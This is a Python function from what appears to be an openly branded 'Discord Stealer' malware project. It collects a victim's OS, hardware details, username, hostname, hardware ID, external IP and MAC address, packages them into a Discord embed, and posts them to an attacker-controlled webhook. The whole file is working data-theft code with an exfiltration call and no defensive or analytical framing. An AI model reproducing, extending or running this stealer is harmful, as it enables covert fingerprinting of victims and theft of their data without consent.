import subprocess, vpo, os, requests, psutil, json

def get_info(webhook: str):
    computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
    cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
    ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
            shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
    username = os.getenv("UserName")
    hostname = os.getenv("COMPUTERNAME")
    hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    ip = vpo.get_external_ipv4()
    interface, addrs = next(iter(psutil.net_if_addrs().items()))
    mac = addrs[0].address
    username = vpo.getuser()
    todo = {
    "username": "🌸 Discord Stealer 🌸",
    "content": "||@everyone||",
    "avatar_url": "https://github.com/yashing2/StealerDiscord/blob/main/OIG3.S8.png?raw=true",
    "embeds": [
        {
            "title": "**🌸 Discord Stealer 🌸**",
            "color": 5639644,
            "fields": [
                {
                    "name": "System Info",
                    "value": f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu}`\n<:gpu:1051512654591688815> **GPU:** `{gpu}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`'''
                }
            ],
            "footer": {
                "text": "Stealer Discord | Created By yashing2 and VMS_SHOP and phantoms_._"
            },
            "thumbnail": {
                "url": "https://github.com/yashing2/StealerDiscord/blob/main/OIG3.S8.png?raw=true"
            }
        }
    ],
    }
    headers = {
        "Content-Type": "application/json"
    }
    r = requests.post(webhook, json=todo, data=json.dumps(todo), headers=headers)